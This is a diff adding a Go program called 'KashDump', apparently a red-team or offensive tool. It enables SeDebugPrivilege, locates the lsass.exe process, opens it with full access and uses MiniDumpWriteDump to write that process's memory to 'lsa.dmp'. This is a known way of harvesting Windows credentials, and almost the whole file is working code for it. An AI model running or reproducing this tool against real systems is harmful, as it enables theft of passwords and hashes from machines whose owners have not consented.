@@ -1,0 +1,391 @@
+/*{
+Name: KashDump
+Description: dumps lsass to file called lsa.dmp
+Options:
+None
+}*/
+
+
+package main
+
+//privilege and impersonation stuff thanks to go-winio. Thanks Microsoft!
+
+import (
+	"bytes"
+	"encoding/binary"
+	"fmt"
+	"log"
+	"runtime"
+	"sync"
+	"syscall"
+	"unicode/utf16"
+	"unsafe"
+)
+
+const (
+	SE_PRIVILEGE_ENABLED = 2
+
+	ERROR_NOT_ALL_ASSIGNED syscall.Errno = 1300
+
+	SeBackupPrivilege  = "SeBackupPrivilege"
+	SeRestorePrivilege = "SeRestorePrivilege"
+)
+
+const (
+	securityAnonymous = iota
+	securityIdentification
+	securityImpersonation
+	securityDelegation
+	errnoERROR_IO_PENDING = 997
+)
+
+var (
+	privNames                                                = make(map[string]uint64)
+	privNameMutex                                            sync.Mutex
+	modadvapi32                                                    = syscall.NewLazyDLL("advapi32.dll")
+	procAdjustTokenPrivileges                                      = modadvapi32.NewProc("AdjustTokenPrivileges")
+	procConvertSecurityDescriptorToStringSecurityDescriptorW       = modadvapi32.NewProc("ConvertSecurityDescriptorToStringSecurityDescriptorW")
+	procConvertSidToStringSidW                                     = modadvapi32.NewProc("ConvertSidToStringSidW")
+	procConvertStringSecurityDescriptorToSecurityDescriptorW       = modadvapi32.NewProc("ConvertStringSecurityDescriptorToSecurityDescriptorW")
+	procGetSecurityDescriptorLength                                = modadvapi32.NewProc("GetSecurityDescriptorLength")
+	procImpersonateSelf                                            = modadvapi32.NewProc("ImpersonateSelf")
+	procDuplicateToken                                             = modadvapi32.NewProc("DuplicateToken")
+	procOpenProcessToken                                           = modadvapi32.NewProc("OpenProcessToken")
+	procLookupAccountNameW                                         = modadvapi32.NewProc("LookupAccountNameW")
+	procLookupPrivilegeDisplayNameW                                = modadvapi32.NewProc("LookupPrivilegeDisplayNameW")
+	procLookupPrivilegeNameW                                       = modadvapi32.NewProc("LookupPrivilegeNameW")
+	procLookupPrivilegeValueW                                      = modadvapi32.NewProc("LookupPrivilegeValueW")
+	procOpenThreadToken                                            = modadvapi32.NewProc("OpenThreadToken")
+	procRevertToSelf                                               = modadvapi32.NewProc("RevertToSelf")
+	errERROR_IO_PENDING                                      error = syscall.Errno(errnoERROR_IO_PENDING)
+	errERROR_EINVAL                                          error = syscall.EINVAL
+
+	modkernel32          = syscall.NewLazyDLL("kernel32.dll")
+	procGetCurrentThread = modkernel32.NewProc("GetCurrentThread")
+)
+
+type PrivilegeError struct {
+	privileges []uint64
+}
+
+func main() {
+
+	err := RunWithPrivilege("SeDebugPrivilege", dumplsass)
+	if err != nil {
+		log.Println(err)
+	}
+}
+
+func dumplsass() error {
+	snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
+	if err != nil {
+		log.Println("snapshot:", err)
+	}
+	var procentry syscall.ProcessEntry32
+	procentry.Size = uint32(unsafe.Sizeof(syscall.ProcessEntry32{}))
+
+	targname := [260]uint16{'l', 's', 'a', 's', 's', '.', 'e', 'x', 'e'}
+	//targname := [260]uint16{'c', 'm', 'd', '.', 'e', 'x', 'e'}
+
+	err = syscall.Process32First(snapshot, &procentry)
+	if err != nil {
+		log.Println(err)
+	}
+
+	var pid uint32
+
+	for {
+		if procentry.ExeFile == [260]uint16(targname) {
+			fmt.Println("success!")
+			pid = procentry.ProcessID
+		}
+		err = syscall.Process32Next(snapshot, &procentry)
+		if err != nil {
+			break
+		}
+	}
+	fmt.Println(pid)
+
+	lhandle, err := syscall.OpenProcess(0x1F0FFF, false, pid)
+	if err != nil {
+		log.Println("openprocess:", err)
+	}
+
+	outfile, err := syscall.CreateFile(syscall.StringToUTF16Ptr("lsa.dmp"), syscall.GENERIC_ALL, 0, nil, syscall.CREATE_ALWAYS, syscall.FILE_ATTRIBUTE_NORMAL, int32(0))
+	if err != nil {
+		log.Println("createfile:", err)
+	}
+	defer syscall.Close(outfile)
+	//get minidumpwrite
+	dbgcore := syscall.NewLazyDLL("Dbghelp.dll")
+
+	//dumpword := syscall.StringToUTF16Ptr("MiniDumpWithFullMemory")
+	minidumpwrite := dbgcore.NewProc("MiniDumpWriteDump")
+
+	//apparently we want incorrect parameters? Shoutout C_Sto, the real GOAT
+	isdumped, _, err := minidumpwrite.Call(uintptr(lhandle), uintptr(pid), uintptr(outfile), 3, 0, 0, 0)
+	if err != nil {
+		log.Println("isdumped:", err)
+	}
+	fmt.Println(isdumped)
+	return err
+}
+
+func RunWithPrivilege(name string, fn func() error) error {
+	return RunWithPrivileges([]string{name}, fn)
+}
+
+// RunWithPrivileges enables privileges for a function call.
+func RunWithPrivileges(names []string, fn func() error) error {
+	privileges, err := mapPrivileges(names)
+	if err != nil {
+		return err
+	}
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+	token, err := newThreadToken()
+	if err != nil {
+		return err
+	}
+	defer releaseThreadToken(token)
+	err = adjustPrivileges(token, privileges, SE_PRIVILEGE_ENABLED)
+	if err != nil {
+		return err
+	}
+	return fn()
+}
+
+func mapPrivileges(names []string) ([]uint64, error) {
+	var privileges []uint64
+	privNameMutex.Lock()
+	defer privNameMutex.Unlock()
+	for _, name := range names {
+		p, ok := privNames[name]
+		if !ok {
+			err := lookupPrivilegeValue("", name, &p)
+			if err != nil {
+				return nil, err
+			}
+			privNames[name] = p
+		}
+		privileges = append(privileges, p)
+	}
+	return privileges, nil
+}
+
+func adjustPrivileges(token syscall.Token, privileges []uint64, action uint32) error {
+	b := new(bytes.Buffer)
+	binary.Write(b, binary.LittleEndian, uint32(len(privileges)))
+	for _, p := range privileges {
+		binary.Write(b, binary.LittleEndian, p)
+		binary.Write(b, binary.LittleEndian, action)
+	}
+	prevState := make([]byte, b.Len())
+	reqSize := uint32(0)
+
+	bbytes := b.Bytes()
+	bptr := &bbytes[0]
+
+
+	success, err := adjustTokenPrivileges(token, false, bptr, uint32(len(prevState)), &prevState[0], &reqSize)
+	if !success {
+		return err
+	}
+	//if err == ERROR_NOT_ALL_ASSIGNED {
+	//	return &PrivilegeError{privileges}
+	//}
+	return nil
+}
+
+// func adjustPrivileges(token syscall.Token, privileges []uint64, action uint32) error {
+// 	var b bytes.Buffer
+// 	binary.Write(&b, binary.LittleEndian, uint32(len(privileges)))
+// 	for _, p := range privileges {
+// 		binary.Write(&b, binary.LittleEndian, p)
+// 		binary.Write(&b, binary.LittleEndian, action)
+// 	}
+// 	prevState := make([]byte, b.Len())
+// 	reqSize := uint32(0)
+// 	success, err := adjustTokenPrivileges(token, false, &b.Bytes()[0], uint32(len(prevState)), &prevState[0], &reqSize)
+// 	if !success {
+// 		return err
+// 	}
+// 	if err == ERROR_NOT_ALL_ASSIGNED {
+// 		return &PrivilegeError{privileges}
+// 	}
+// 	return nil
+// }
+
+func adjustTokenPrivileges(token syscall.Token, releaseAll bool, input *byte, outputSize uint32, output *byte, requiredSize *uint32) (success bool, err error) {
+	var _p0 uint32
+	if releaseAll {
+		_p0 = 1
+	}
+	r0, _, e1 := syscall.Syscall6(procAdjustTokenPrivileges.Addr(), 6, uintptr(token), uintptr(_p0), uintptr(unsafe.Pointer(input)), uintptr(outputSize), uintptr(unsafe.Pointer(output)), uintptr(unsafe.Pointer(requiredSize)))
+	success = r0 != 0
+	if true {
+		err = errnoErr(e1)
+	}
+	return
+}
+
+func (e *PrivilegeError) Error() string {
+	s := ""
+	if len(e.privileges) > 1 {
+		s = "Could not enable privileges "
+	} else {
+		s = "Could not enable privilege "
+	}
+	for i, p := range e.privileges {
+		if i != 0 {
+			s += ", "
+		}
+		s += `"`
+		s += getPrivilegeName(p)
+		s += `"`
+	}
+	return s
+}
+
+func getPrivilegeName(luid uint64) string {
+	var nameBuffer [256]uint16
+	bufSize := uint32(len(nameBuffer))
+	err := lookupPrivilegeName("", &luid, &nameBuffer[0], &bufSize)
+	if err != nil {
+		return fmt.Sprintf("<unknown privilege %d>", luid)
+	}
+
+	var displayNameBuffer [256]uint16
+	displayBufSize := uint32(len(displayNameBuffer))
+	var langID uint32
+	err = lookupPrivilegeDisplayName("", &nameBuffer[0], &displayNameBuffer[0], &displayBufSize, &langID)
+	if err != nil {
+		return fmt.Sprintf("<unknown privilege %s>", string(utf16.Decode(nameBuffer[:bufSize])))
+	}
+
+	return string(utf16.Decode(displayNameBuffer[:displayBufSize]))
+}
+
+func lookupPrivilegeDisplayName(systemName string, name *uint16, buffer *uint16, size *uint32, languageId *uint32) (err error) {
+	var _p0 *uint16
+	_p0, err = syscall.UTF16PtrFromString(systemName)
+	if err != nil {
+		return
+	}
+	return _lookupPrivilegeDisplayName(_p0, name, buffer, size, languageId)
+}
+
+func _lookupPrivilegeDisplayName(systemName *uint16, name *uint16, buffer *uint16, size *uint32, languageId *uint32) (err error) {
+	r1, _, e1 := syscall.Syscall6(procLookupPrivilegeDisplayNameW.Addr(), 5, uintptr(unsafe.Pointer(systemName)), uintptr(unsafe.Pointer(name)), uintptr(unsafe.Pointer(buffer)), uintptr(unsafe.Pointer(size)), uintptr(unsafe.Pointer(languageId)), 0)
+	if r1 == 0 {
+		err = errnoErr(e1)
+	}
+	return
+}
+
+func lookupPrivilegeName(systemName string, luid *uint64, buffer *uint16, size *uint32) (err error) {
+	var _p0 *uint16
+	_p0, err = syscall.UTF16PtrFromString(systemName)
+	if err != nil {
+		return
+	}
+	return _lookupPrivilegeName(_p0, luid, buffer, size)
+}
+
+func _lookupPrivilegeName(systemName *uint16, luid *uint64, buffer *uint16, size *uint32) (err error) {
+	r1, _, e1 := syscall.Syscall6(procLookupPrivilegeNameW.Addr(), 4, uintptr(unsafe.Pointer(systemName)), uintptr(unsafe.Pointer(luid)), uintptr(unsafe.Pointer(buffer)), uintptr(unsafe.Pointer(size)), 0, 0)
+	if r1 == 0 {
+		err = errnoErr(e1)
+	}
+	return
+}
+
+func errnoErr(e syscall.Errno) error {
+	switch e {
+	case 0:
+		return errERROR_EINVAL
+	case errnoERROR_IO_PENDING:
+		return errERROR_IO_PENDING
+	}
+	return e
+}
+
+func newThreadToken() (syscall.Token, error) {
+	err := impersonateSelf(securityImpersonation)
+	if err != nil {
+		return 0, err
+	}
+
+	var token syscall.Token
+	err = openThreadToken(getCurrentThread(), syscall.TOKEN_ADJUST_PRIVILEGES|syscall.TOKEN_QUERY, false, &token)
+	if err != nil {
+		rerr := revertToSelf()
+		if rerr != nil {
+			panic(rerr)
+		}
+		return 0, err
+	}
+	return token, nil
+}
+
+func releaseThreadToken(h syscall.Token) {
+	err := revertToSelf()
+	if err != nil {
+		panic(err)
+	}
+	h.Close()
+}
+
+func impersonateSelf(level uint32) (err error) {
+	r1, _, e1 := syscall.Syscall(procImpersonateSelf.Addr(), 1, uintptr(level), 0, 0)
+	if r1 == 0 {
+		err = errnoErr(e1)
+	}
+	return
+}
+
+func openThreadToken(thread syscall.Handle, accessMask uint32, openAsSelf bool, token *syscall.Token) (err error) {
+	var _p0 uint32
+	if openAsSelf {
+		_p0 = 1
+	}
+	r1, _, e1 := syscall.Syscall6(procOpenThreadToken.Addr(), 4, uintptr(thread), uintptr(accessMask), uintptr(_p0), uintptr(unsafe.Pointer(token)), 0, 0)
+	if r1 == 0 {
+		err = errnoErr(e1)
+	}
+	return
+}
+func getCurrentThread() (h syscall.Handle) {
+	r0, _, _ := syscall.Syscall(procGetCurrentThread.Addr(), 0, 0, 0, 0)
+	h = syscall.Handle(r0)
+	return
+}
+func revertToSelf() (err error) {
+	r1, _, e1 := syscall.Syscall(procRevertToSelf.Addr(), 0, 0, 0, 0)
+	if r1 == 0 {
+		err = errnoErr(e1)
+	}
+	return
+}
+
+func lookupPrivilegeValue(systemName string, name string, luid *uint64) (err error) {
+	var _p0 *uint16
+	_p0, err = syscall.UTF16PtrFromString(systemName)
+	if err != nil {
+		return
+	}
+	var _p1 *uint16
+	_p1, err = syscall.UTF16PtrFromString(name)
+	if err != nil {
+		return
+	}
+	return _lookupPrivilegeValue(_p0, _p1, luid)
+}
+
+func _lookupPrivilegeValue(systemName *uint16, name *uint16, luid *uint64) (err error) {
+	r1, _, e1 := syscall.Syscall(procLookupPrivilegeValueW.Addr(), 3, uintptr(unsafe.Pointer(systemName)), uintptr(unsafe.Pointer(name)), uintptr(unsafe.Pointer(luid)))
+	if r1 == 0 {
+		err = errnoErr(e1)
+	}
+	return
+}
